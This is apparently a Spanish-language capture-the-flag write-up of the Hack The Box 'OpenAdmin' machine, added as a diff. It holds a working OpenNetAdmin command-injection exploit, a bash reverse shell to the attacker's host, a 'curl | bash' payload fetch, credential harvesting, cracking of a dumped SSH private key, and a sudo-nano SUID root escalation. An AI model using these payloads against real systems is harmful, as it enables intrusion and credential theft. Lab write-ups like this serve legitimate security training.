@@ -1,0 +1,566 @@
+---------------------
+[ OPENADMIN MACHINE ]
+---------------------
+
+# Notas sobre la resolución de la máquina OPENADMIN por FeathersMcgr4w
+
+[GITHUB]: https://github.com/FeathersMcgr4w/
+
+[Lets Start!]
+
+-----
+| 1 | Ejecutamos un ping para verificar si esta activa la maquina victima --> ping -c 1 10.10.10.171
+-----
+        -> ping -c 1 10.10.10.171 -R  (Trace Route)
+
+        [*] ttl: 63 (Linux) => Linux (ttl=64) | Windows (ttl=128)
+
+
+
+-----
+| 2 | Escaneo rápido de Puertos con NMAP
+-----
+
+└─$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.171 -oG allPorts
+
+Puertos Abiertos:
+
+        [*] Open ports: 22, 80
+
+
+
+-----
+| 3 | Obtener información detallada con NMAP:
+-----
+
+(scripts de reconocimiento y exportar en formato nmap)
+
+locate .nse | xargs grep "categories" | grep -oP '".*?"' | tr -d '"' | sort -u (scripts de reconocimiento)
+
+
+└─# nmap -sCV -p22,80 10.10.10.171 -oN targeted
+
+
+
+-----
+| 4 | Realizamos un curl solo cabezeras
+-----
+
+└─$ curl -sX GET "http://10.10.10.171" -I
+
+
+
+-----
+| 5 | WHATWEB
+-----
+
+└─$ whatweb 10.10.10.171                                                                                                       
+http://10.10.10.171 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], Title[Apache2 Ubuntu Default Page: It works]
+
+
+
+-----
+| 6 |  Fuzzeamos con wfuzz
+-----
+
+└─$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.171/FUZZ
+
+     wfuzz : ejecutar herramienta wfuzz
+
+     -c : activar salida de colores en la terminal.
+
+     --hc=404 : wfuzz ignorara las respuestas http con código de estado 404
+    
+     -t 200 : usar 200 hilos de ejecución en paralelo ( 200 consultas en paralelo )
+
+     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt : diccionario que utiliza wfuzz
+
+     http://10.10.10.171/FUZZ : URL objetivo + "FUZZ" marca la posición donde coloca el diccionario
+
+
+-[ RESULTADOS ]:
+
+000005045:   301        9 L      28 W       314 Ch      "artwork"                                                                                                                   
+000000172:   301        9 L      28 W       312 Ch      "music"                                                                                                                     
+000044892:   301        9 L      28 W       313 Ch      "sierra"                                                                                                                    
+000045240:   200        375 L    964 W      10918 Ch    "http://10.10.10.171/"
+
+
+
+-----
+| 7 | Inspeccionamos las rutas que fuzzeamos
+-----
+
+10.10.10.171/artwork --> [ Aca no hay nada!]
+
+10.10.10.171/music
+	|
+	|-> http://10.10.10.171/ona/ [ LOGIN ]
+
+	[i] Redirije a un servicio de OpenNetAdmin
+
+
+-[*] ¿Qué es OpenNetAdmin? (ONA)
+
+Es una herramienta de gestion de red de código abierto para administradores.
+
+ONA permite centralizar un inventario de red, seguimiento detallado de dispositivos, direcciones IP, subredes, infraestructura relacionada.
+
+Caracteristicas:
+
+-> Gestion de direcciones IP
+-> Inventario de dispositivos
+-> Interfaces y VLANs (interfaces de red, puertos)
+-> Escaneos
+
+
+-[*] Buscamos exploits
+
+>> Buscar en Google: "OpenNetAdmin exploit"
+
+	OpenNetAdmin 18.1.1 - Remote Code Execution
+
+	https://medium.com/r3d-buck3t/remote-code-execution-in-opennetadmin-5d5a53b1e67
+
+>> Buscar en searchsploit opennetadmin
+
+	OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                              | php/webapps/26682.txt
+	OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                               | php/webapps/47772.rb
+	OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                                | php/webapps/47691.sh
+
+-[ NOTA ]: Colocando searchsploit -x 47691 (path), podemos ver el script .sh
+
+
+-#!/bin/bash
+
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+
+
+---------------------------
+| Explicación del exploit |
+---------------------------
+
+La vulnerabilidad del remote commnad execution (RCE) se produce en la versión 18.1.1 del servicio OpenNetAdmin.
+
+La vulnerabilidad se presenta en las funciones no sanitizadas de entrada de datos del usuario.
+
+	curl --silent -d : realiza un POST con datos en el cuerpo
+
+	xajax=window_submit&xajaxr=1574117726710 : parametros utilizados por OpenNetAdmin en solicitud AJAX para que procese el servidor
+
+	xajaxargs[]=tooltips : parametros utilizados por OpenNetAdmin en solicitud AJAX para que procese el servidor
+
+	xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\" : inyección de comando
+
+		ip%3D%3E : representación de URL encode (ip=>), probablemente es parte de una cadena de datos usada por OpenNetAdmin
+
+	xajaxargs[]=ping : parametros utilizados por OpenNetAdmin en solicitud AJAX para que procese el servidor
+
+
+
+
+-[*] Ejecutamos una llamada con el código:
+
+└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | w3m -dump -T text/html
+Ping Results  [icon_close]
+
+BEGIN
+www-data
+END
+
+         [Close]
+]]>
+
+
+Con esto ya podemos ejecutar el Remote Command Excecution (RCE)
+
+
+
+-----
+| 8 | Ejecutamos el RCE
+-----
+
+-( 1 ) Generamos un archivo html con código bash
+
+└─$ touch index.html
+
+└─$ nano index.html
+
+└─$ cat index.html                                                    
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.16.4/443 0>&1
+
+
+-( 2 ) Levantamos servidor python3
+
+python3 -m http.server 80
+
+
+-( 3 ) Interpretamos con bash y escuchamos por nc -nlvp 443
+
+└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 10.10.16.4|bash;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | w3m -dump -T text/html
+
+
+-( 4 ) Estamos en el sistema
+
+└─$ nc -nlvp 443       
+listening on [any] 443 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.171] 58174
+bash: cannot set terminal process group (1299): Inappropriate ioctl for device
+bash: no job control in this shell
+
+www-data@openadmin:/opt/ona/www$ hostname -I
+hostname -I
+10.10.10.171 dead:beef::250:56ff:feb0:ca8a
+
+www-data@openadmin:/opt/ona/www$ script /dev/null -c bash ((( PSEUDO CONSOLA )))
+
+
+-[*] Cambiamos interprete a bash
+
+www-data@openadmin:/opt/ona/www/config$ export SHELL=bash
+
+
+-[*] Buscamos credenciales:
+
+www-data@openadmin:/opt/ona/www$ grep -r -i -E "user|pass|database"
+
+NO ENCONTRAMOS NADA!
+
+
+-[*] Buscamos usuarios:
+
+www-data@openadmin:/opt/ona/www$ ls /home/
+ls /home/
+jimmy  joanna
+
+www-data@openadmin:/opt/ona/www$ cd /home/jimmy
+cd /home/jimmy
+bash: cd: /home/jimmy: Permission denied
+
+www-data@openadmin:/opt/ona/www$ cat /etc/passwd | grep -i -E "root|jimmy|joanna"
+<w$ cat /etc/passwd | grep -i -E "root|jimmy|joanna"
+root:x:0:0:root:/root:/bin/bash
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+
+-[ NOTA ]: jimmy y joanna requieren privilegios
+
+
+-[*] Vemos grupo sudo:
+
+www-data@openadmin:/home$ sudo -l
+sudo -l
+sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
+sudo: error initializing audit plugin sudoers_audit
+
+
+- [*] Navegamos el directorio del server "var/www/internal"
+
+drwxr-xr-x 6 www-data www-data 4096 Nov 22  2019 html
+drwxrwx--- 2 jimmy    internal 4096 Nov 23  2019 internal
+lrwxrwxrwx 1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
+
+bash: cd: internal: Permission denied
+
+
+-[*] Tenemos que buscar una contraseña para escalar privilegios.
+
+-[*] Filtrar por "config" o "database"
+
+www-data@openadmin:/var/www/ona$ find \-type f 2>/dev/null | grep "config"
+find \-type f 2>/dev/null | grep "config"
+
+./config/auth_ldap.config.php
+./config/config.inc.php
+./local/config/motd.txt.example
+./local/config/run_installer
+./local/config/database_settings.inc.php <-- *TARGET* -->
+./winc/list_configs.inc.php
+./winc/app_config_type_edit.inc.php
+./winc/app_config_type_list.inc.php
+./winc/display_config_text.inc.php
+./workspace_plugins/builtin/config_archives/main.inc.php
+./workspace_plugins/builtin/host_actions/config.inc.php
+./config_dnld.php
+./modules/ona/configuration.inc.php
+
+
+
+
+www-data@openadmin:/var/www/ona$ cat ./local/config/database_settings.inc.php
+cat ./local/config/database_settings.inc.php
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+
+
+-[*] Escalamos privilegios a Jimmy
+
+www-data@openadmin:/var/www/ona$ cat /etc/passwd | grep "sh$"
+cat /etc/passwd | grep "sh$"
+root:x:0:0:root:/root:/bin/bash
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+
+www-data@openadmin:/var/www/ona$ su jimmy
+su jimmy
+Password: n1nj4W4rri0R!
+
+jimmy@openadmin:/opt/ona/www$ whoami
+whoami
+jimmy
+
+
+-[*] Directorio "internal"
+
+jimmy@openadmin:/var/www/internal$ ls -l
+ls -l
+total 12
+-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
+
+
+jimmy@openadmin:/var/www/internal$ cat main.php
+
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>$output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+
+
+>> Aqui observamos que por la web se solicita una clave "ssh/id_rsa" del usuario joanna.
+>> Esto se esta ejecutando desde otro puerto
+
+
+Nos dirijimos al directorio: "/etc/apache2/sites-enabled/" y buscamos "internal.conf"
+
+Este directorio contiene archivos de configuración que activan sitios web especificos del servidor.
+Suelen ser enlaces simbolocos que apuntan a archivos en el directorio /etc/apache2/sites-available/
+
+
+
+-[ /etc/apache2/sites-enabled/internal.conf ]
+
+jimmy@openadmin:/etc/apache2/sites-enabled$ ls
+internal.conf  openadmin.conf
+jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf
+Listen 127.0.0.1:52846
+
+<VirtualHost 127.0.0.1:52846>
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+<IfModule mpm_itk_module>
+AssignUserID joanna joanna
+</IfModule>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+
+
+>> Aqui vemos que el servidor monta un servicio 'VirtualHost' por el puerto 52846.en local (localHost) con el ID de joanna.
+
+>> No podemos acceder externamente, pero si internamente.
+
+>> Aqui nos vamos a aprovechar de llamar al 'localHost' como si fueramos "joanna" (por que el localhost tiene asignado el id de joanna)
+
+
+-[*] Nos dirigimos a /var/www/internal
+
+Desde esta ruta, creamos un fichero para validar que podemos ejecutar comandos como "joanna"
+
+	1) Creamos fichero 'shell.php' y dentro <?php system("whoami"); ?>
+
+	2) Ejecutamos el fichero
+
+		jimmy@openadmin:/var/www/internal$ curl localhost:52846/shell.php
+		joanna
+
+	3) Efectivamente podemos ejecutar comandos como joanna!
+
+
+-[*] Con esta misma tecnica, lo aplicamos al archivo "main.php" que llama a la clave 'id_rsa' de joanna
+
+jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php
+<pre>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+</pre><html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+ 
+
+-[*] Crackear clave encriptada con John The Ripper
+
+La clave id_rsa esta encriptada!
+
+Usaremos esta tool -> /usr/share/john/ssh2john.py (ya esta instalada en Kali Linux) para crackear
+
+Creamos un fichero id_rsa en directorio /tmp con la clave
+
+cd /tmp
+touch id_rsa
+nano id_rsa
+chmod 600 id_rsa (permisos)
+
+
+└─$ /usr/share/john/ssh2john.py id_rsa > hash (Esto guarda un hash de la clave)
+
+
+Ejecutamos fuerza bruta al fichero "hash"
+
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+bloodninjas      (id_rsa) --> (password!)
+
+
+
+-[*] Ahora nos conectamos por ssh id_rsa
+
+
+└─$ ssh -i id_rsa joanna@10.10.10.171
+Enter passphrase for key 'id_rsa': bloodninjas
+
+
+-[*] 1° FLAG
+
+joanna@openadmin:~$ pwd
+/home/joanna
+
+joanna@openadmin:~$ cat user.txt
+c0c1a02b9a8590083632f68b05a69830
+
+
+-[*] Escalar privilegios a ROOT:
+
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+
+
+-[ NOTA ]: Aqui vemos que podemos ejecutar nano como root para editar el fichero "/opt/priv"
+
+
+joanna@openadmin:~$ sudo -u root nano /opt/priv
+
+Ctrol+r (inserting external files into the current)
+Ctrol+x (command execution)
+
+Ejecutamos el siguiente comando: chmod 4755 /bin/bash (asigna bit SUID al binario 'bash')
+
+Con esto conseguimos elevar el privilegio.
+
+-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash [ ANTES ]
+joanna@openadmin:~$ sudo -u root nano /opt/priv
+
+joanna@openadmin:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash [ DESPUES ]
+
+
+Ahora ejecutamos "bash -p"
+
+Este comando inicia una nueva instancia de shell en modo privilegiado (hereda los privilegios del propietario SUID)
+
+joanna@openadmin:~$ bash -p
+
+bash-4.4# whoami
+root
+
+bash-4.4# pwd
+/home/joanna
+
+bash-4.4# cd /root/
+
+bash-4.4# ls -l
+total 4
+-r-------- 1 root root 33 Oct 17 14:30 root.txt
+
+bash-4.4# cat root.txt
+2dc757d57fc8b3ab9f079642974aad83
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
